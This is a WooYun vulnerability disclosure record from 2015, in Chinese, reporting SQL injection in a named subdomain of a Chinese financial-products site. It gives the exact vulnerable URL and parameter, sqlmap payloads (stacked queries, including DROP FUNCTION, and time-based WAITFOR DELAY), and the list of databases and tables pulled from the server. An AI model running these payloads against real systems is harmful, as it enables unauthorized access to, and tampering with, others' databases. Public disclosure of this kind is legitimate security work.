{"id": 26922, "wybug_id": "wooyun-2015-0127334", "wybug_title": "金牛理财网分站存在SQL注入", "wybug_corp": "金牛理财网", "wybug_author": "路人甲", "wybug_date": "2015-07-17 14:41", "wybug_open_date": "2015-08-31 14:42", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 过滤不严 详细说明：  \n\n地址：http://bankdata.jnlc.com/SitePages/productinfo.aspx?iFinancID=267427sqlmap扫描结果：Place: GETParameter: iFinancID    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: iFinancID=267427'; IF(2052=2052) SELECT 2052 ELSE DROP FUNCTION xwOa--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: iFinancID=267427'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: iFinancID=267427' WAITFOR DELAY '0:0:5'-----[11:53:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008available databases [6]:[*] finchina[*] master[*] model[*] msdb[*] tempdb[*] YHLCDatabase: msdb[21 tables]+--------------------------------------------+| backupfile                                 || backupmediafamily                          || backupmediaset                             || backupset                                  || logmarkhistory                             || restorefile                                || restorefilegroup                           || restorehistory                             || suspect_pages                              || sysdac_instances                           || syspolicy_conditions                       || syspolicy_configuration                    || syspolicy_object_sets                      || syspolicy_policies                         || syspolicy_policy_categories                || syspolicy_policy_category_subscriptions    || syspolicy_policy_execution_history         || syspolicy_policy_execution_history_details || syspolicy_system_health_state              || syspolicy_target_set_levels                || syspolicy_target_sets                      |+--------------------------------------------+Database: YHLC[41 tables]+----------------------------------------------+| BankTypeOrder                                || BankVip                                      || MSreplication_objects                        || MSreplication_subscriptions                  || MSsnapshotdeliveryprogress                   || MSsubscription_agents                        || MSsubscription_properties                    || S3_Tmp                                       || TradingDays                                  || YHLC_BankFinacleRateByPeriod                 || YHLC_BankFinacleRateByPeriodFindProduct_TEMP || YHLC_tbAgencyForIndex                        || YHLC_tbAgencyForVip                          || YHLC_tbjnlcIndex                             || tbAgencyOrgan                                || tbBankFinacle                                || tbConfig                                     || v_BankFinacle                                || v_BankFinacleSingleInf                       || v_GetAllLcqxMonthAVGSyl_AllBanks             || v_GetAllLcqxMonthAVGSyl_ByBankID             || v_GetAllLcqxMonthAVGSyl_ByProfitType         || v_GetAllLcqxQuarterAVGSyl_AllBanks           || v_GetAllLcqxQuarterAVGSyl_ByBankID           || v_GetAllLcqxQuarterAVGSyl_ByProfitType       || v_GetAllLcqxWeekAVGSyl_AllBanks              || v_GetAllLcqxWeekAVGSyl_ByBankID              || v_GetAllLcqxWeekAVGSyl_ByProfitType          || v_GetBankFinacleAllProducts                  || v_GetBankFinacleByBankLCQX                   || v_GetBankFinacleHomepage                     || v_GetMonthAVGSyl_AllBanks                    || v_GetMonthAVGSyl_ByBankID                    || v_GetMonthAVGSyl_ByProfitType                || v_GetQuarterAVGSyl_AllBanks                  || v_GetQuarterAVGSyl_ByBankID                  || v_GetQuarterAVGSyl_ByProfitType              || v_GetWeekAVGSyl_AllBanks                     || v_GetWeekAVGSyl_ByBankID                     || v_GetWeekAVGSyl_ByProfitType                 || v_GetWeekTotalCirculation_Homepage           |+----------------------------------------------+网太渣，只弄了两个数据库做代表。。。   漏洞证明：  上面↑   修复方案：  加强过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}